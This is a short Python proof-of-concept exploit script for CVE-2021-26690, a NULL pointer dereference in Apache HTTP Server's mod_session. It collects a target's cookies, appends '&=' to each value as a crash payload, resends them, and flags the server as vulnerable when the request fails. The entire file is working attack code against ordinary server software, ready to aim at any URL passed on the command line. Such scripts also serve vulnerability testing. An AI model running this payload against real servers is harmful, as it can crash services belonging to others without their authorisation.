# CVE-2021-26690
# Apache HTTP mod_session NULL pointer dereference
# version : 2.4.0~2.4.46
# version(reg) : ^2\.4\.(0|[1-9][0-9]{0,1}|4[0-6])$

import requests
import argparse 


def get_cookie_list(URL):
    response = requests.get(URL)
    cookie_list = []

    if response.cookies:
        for cookie in response.cookies:
            cookie_list.append({"name": cookie.name, "value": cookie.value})
        return cookie_list
    else:
        print(f"[-] No cookies found on {URL}")
        print(f"[-] Detected Vulnerability : False")
        return False


def exploit(URL,cookie_list):
    for cookie in cookie_list:
        #PoC
        cookies = {cookie['name']: cookie['value'] + "&="}
        print(f"[+] Payload sent: {cookies}")

        try:
            response = requests.get(URL, cookies=cookies)
            print(f"[-] status_code : {response.status_code}")
            print(f"[-] Detected Vulnerability : False")
        except requests.exceptions.RequestException as e:
            print(f"[+] An error occurred: {e}")
            print(f"[*] Detected Vulnerability : True")
            break


if __name__ == "__main__":

    print('''======================================\n           CVE-2021-26690\n mod_session NULL pointer dereference\n======================================''')

    parser = argparse.ArgumentParser(description="Exploit CVE-2021-26690 - mod_session NULL pointer dereference")
    parser.add_argument("-u", "--URL", required=True, help="Target server URL (e.g., http://localhost:8080/)")
    args = parser.parse_args()

    cookie_list = get_cookie_list(args.URL)

    if cookie_list:
        print("[+] Cookies found:", cookie_list)
        exploit(args.URL, cookie_list)